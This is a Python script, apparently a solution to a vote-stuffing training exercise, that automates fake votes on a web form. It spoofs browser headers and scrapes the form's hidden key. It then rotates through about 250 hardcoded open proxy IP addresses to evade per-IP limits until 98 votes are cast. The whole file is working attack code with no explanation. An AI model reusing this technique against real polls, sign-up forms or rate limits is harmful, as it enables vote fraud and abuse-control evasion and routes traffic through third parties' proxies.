#!/usr/bin/python3

import requests
import time
import re

page = 'http://158.69.76.135/level4.php'
my_data = {'id': '930', 'holdthedoor': 'Submit'}
referer = page
u_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \
(KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
headers = {'User-Agent': u_agent, 'Referer': page}

proxies = ["114.6.114.100:443",
           "71.183.100.76:42413",
           "197.149.125.50:45224",
           "14.207.28.100:8080",
           "163.47.33.2:8080",
           "178.238.126.91:8080",
           "3.89.214.236:80",
           "115.124.67.186:80",
           "36.92.22.70:8080",
           "200.16.134.35:8080",
           "103.23.134.22:8080",
           "80.211.45.251:3128",
           "95.0.226.84:43349",
           "62.99.53.95:32654",
           "83.242.123.248:8080",
           "41.76.196.173:8080",
           "85.9.217.48:3355",
           "14.140.9.166:8080",
           "36.92.68.141:8080",
           "180.248.134.92:8080",
           "113.160.235.49:8080",
           "170.78.75.111:8080",
           "43.255.228.150:3128",
           "190.104.47.51:8081",
           "125.26.7.115:30012",
           "174.138.38.135:3128",
           "157.245.192.250:8080",
           "180.183.16.136:8080",
           "110.164.212.90:8080",
           "5.160.72.146:32074",
           "43.241.131.105:8080",
           "91.192.4.27:8080",
           "203.246.112.133:3128",
           "195.7.9.242:8080",
           "101.51.241.66:8080",
           "202.182.48.86:57942",
           "36.77.224.22:8080",
           "14.207.1.165:8213",
           "186.215.222.82:8080",
           "79.175.132.41:3128",
           "41.73.15.130:80",
           "180.253.11.83:8080",
           "208.180.237.55:31012",
           "85.133.130.131:8080",
           "197.221.113.65:42677",
           "36.67.66.202:59814",
           "14.207.3.171:8213",
           "207.148.106.222:8080",
           "186.72.254.38:8080",
           "12.189.124.100:34227",
           "93.116.57.4:54838",
           "116.254.112.160:8080",
           "125.209.82.78:35087",
           "180.242.12.178:8080",
           "110.164.101.129:8080",
           "195.76.144.228:80",
           "213.145.137.102:39364",
           "46.99.144.194:8888",
           "188.133.172.220:8080",
           "183.88.241.219:8080",
           "118.172.176.61:8080",
           "110.78.138.169:8213",
           "200.4.169.181:3128",
           "200.16.208.187:8080",
           "212.28.237.131:32529",
           "178.57.115.124:8080",
           "222.124.193.113:8080",
           "106.240.254.138:80",
           "163.172.136.226:8811",
           "218.240.53.53:8080",
           "193.106.94.106:8080",
           "119.15.93.98:8080",
           "202.150.143.59:41092",
           "95.38.14.3:8080",
           "223.25.101.242:59504",
           "27.147.209.215:8080",
           "190.85.115.78:3128",
           "125.25.162.24:8080",
           "167.71.97.146:3128",
           "82.114.70.2:8080",
           "189.80.3.187:8080",
           "125.25.40.37:8080",
           "119.76.141.43:8080",
           "110.164.73.134:8080",
           "157.245.160.97:80",
           "81.18.34.98:42196",
           "45.70.200.179:8080",
           "171.25.235.4:8080",
           "190.104.64.242:9090",
           "78.24.101.86:8080",
           "94.40.90.10:46608",
           "113.53.13.25:8080",
           "195.201.230.61:3128",
           "112.78.156.212:3128",
           "60.251.224.69:55977",
           "213.233.161.70:63141",
           "168.70.26.227:8197",
           "103.75.101.97:8080",
           "181.115.168.3:53253",
           "188.137.100.250:51036",
           "27.72.72.48:60131",
           "158.255.23.146:33457",
           "181.198.42.229:8080",
           "109.251.185.20:44410",
           "93.117.72.27:55871",
           "87.99.93.101:43944",
           "109.126.200.56:8080",
           "182.53.50.2:8080",
           "36.92.63.122:8080",
           "177.220.188.213:8080",
           "159.224.83.100:8080",
           "118.163.13.200:8080",
           "103.226.49.114:8080",
           "111.118.128.123:8080",
           "165.22.106.182:3128",
           "160.202.129.18:8081",
           "103.120.200.6:8080",
           "118.172.211.37:58728",
           "202.57.2.19:8080",
           "46.99.255.235:8080",
           "91.109.194.148:8080",
           "110.78.153.49:3128",
           "163.53.206.145:8080",
           "24.113.141.227:48678",
           "125.163.66.56:3128",
           "110.77.199.71:8213",
           "59.127.55.215:53715",
           "212.42.113.240:36910",
           "36.92.108.150:3128",
           "110.78.81.107:8080",
           "104.248.95.152:8888",
           "113.53.61.165:8080",
           "193.34.55.64:50099",
           "51.91.96.184:3128",
           "178.250.92.18:8080",
           "190.180.160.127:3128",
           "191.82.236.216:8080",
           "52.139.5.123:3128",
           "36.67.76.234:8080",
           "62.213.14.166:8080",
           "163.172.152.52:8811",
           "197.254.38.250:40853",
           "202.52.234.236:35931 ",
           "77.38.21.239:8080",
           "173.242.102.241:61634",
           "183.88.109.237:8080",
           "27.147.179.232:8080",
           "118.173.140.65:8081",
           "118.172.127.144:8080",
           "70.169.132.131:48678",
           "178.205.254.106:8080",
           "109.86.219.179:53438",
           "180.250.180.66:8080",
           "200.88.117.69:8080",
           "113.53.60.18:48444",
           "189.90.254.147:8080",
           "110.164.95.246:8080",
           "176.241.89.36:38170",
           "37.145.184.104:8080",
           "94.75.125.119:8080",
           "92.86.10.42:42658",
           "210.16.76.129:8080",
           "212.24.60.180:8080",
           "87.116.134.107:35695",
           "80.241.210.126:3128",
           "79.104.197.58:8080",
           "203.80.170.130:8080",
           "41.85.191.6:57797",
           "190.5.118.42:8080",
           "103.211.76.5:8080",
           "195.138.82.198:50309",
           "189.27.70.46:8080",
           "113.53.185.229:8081",
           "163.172.154.72:8811",
           "103.101.17.171:8080",
           "139.194.43.133:8080",
           "213.14.31.122:48024",
           "122.55.48.131:8080",
           "202.191.8.174:8080",
           "200.105.215.18:33630",
           "36.67.158.49:65301",
           "200.105.215.18:33630",
           "36.67.158.49:65301",
           "185.130.144.207:43992",
           "36.77.251.196:8080",
           "36.92.1.221:8080",
           "41.160.114.37:12354",
           "36.37.81.135:8080",
           "103.94.4.99:8080",
           "80.211.250.252:8080",
           "188.166.119.186:80",
           "37.187.3.45:999",
           "177.70.172.242:8080",
           "182.52.36.130:8080",
           "115.79.63.188:8081",
           "115.87.243.216:8080",
           "157.119.207.35:8080",
           "80.249.80.6:3128",
           "180.211.183.2:8080",
           "47.52.231.140:8080",
           "118.174.46.162:8080",
           "118.174.65.137:41255",
           "146.88.51.234:80",
           "195.170.15.66:8080",
           "178.155.14.244:8080",
           "116.62.230.11:3128",
           "113.53.230.167:80",
           "169.239.45.37:8080",
           "185.200.36.91:8080",
           "203.173.93.20:59015",
           "118.91.175.210:8080",
           "5.181.19.1:8080",
           "110.77.221.87:8080",
           "119.15.95.158:8080 ",
           "109.86.190.193:8080",
           "212.22.95.35:3128",
           "36.89.149.107:8080",
           "223.205.76.213:8080",
           "45.56.68.205:3128",
           "51.158.98.121:8811",
           "116.90.229.186:51436",
           "202.57.5.58:8080",
           "193.86.229.230:8080",
           "62.201.217.194:8080",
           "109.111.229.218:6666",
           "190.205.98.150:53078",
           "178.76.69.132:45014",
           "175.184.232.74:8080",
           "36.89.41.26:38718",
           "180.254.158.117:3128",
           "155.93.108.170:59829",
           "180.183.140.178:8213",
           "62.252.140.210:8080",
           "118.174.233.41:41469",
           "109.70.201.97:53517",
           "190.14.229.196:8080",
           "178.79.24.36:8080",
           "94.51.83.2:8080",
           "117.240.79.18:3128",
           "36.89.209.42:42852",
           "200.24.17.54:8080",
           "41.60.239.229:8080",
           "178.134.208.30:8080",
           "36.91.51.233:3128",
           "159.224.169.115:57616",
           "78.47.202.24:3128",
           "167.71.59.12:3128",
           "51.38.71.101:8080 ",
           "202.154.180.53:44009",
           "157.245.0.154:3128",
           "203.99.118.178:36320",
           "177.128.138.36:8080",
           "189.187.174.189:8080",
           "113.53.255.222:8080",
           "5.137.224.62:8080",
           "159.253.110.8:57539",
           "103.94.5.54:8080",
           "175.106.17.98:8080",
           "2.139.210.217:8080",
           "14.207.123.177:8080 "]
hecho = 'H'
votos = 98
Gud = 0
falla = 0
s = requests.Session()
s.headers.update(headers)

for a, i in enumerate(proxies):
    try:
        res = s.get(page, headers=headers)
        if res.status_code is not 200:
            continue
        leter = re.findall("value=\"([^\"]+)\"", res.text)
        if not len(leter):
            continue

        my_data["key"] = leter[0]

        res = s.post(page, data=my_data, proxies={"http": "http://" + i},
                     timeout=5)
        if res.status_code is 200 and hecho in res.text:
            falla = 0
            Gud += 1
            print("{} Hecho!".format(Gud))
    except Exception as a:
        print(a)
        falla += 1
    finally:
        if Gud >= votos or falla >= 100:
            break

print("Finished: {}/{} votes.".format(Gud, votos))
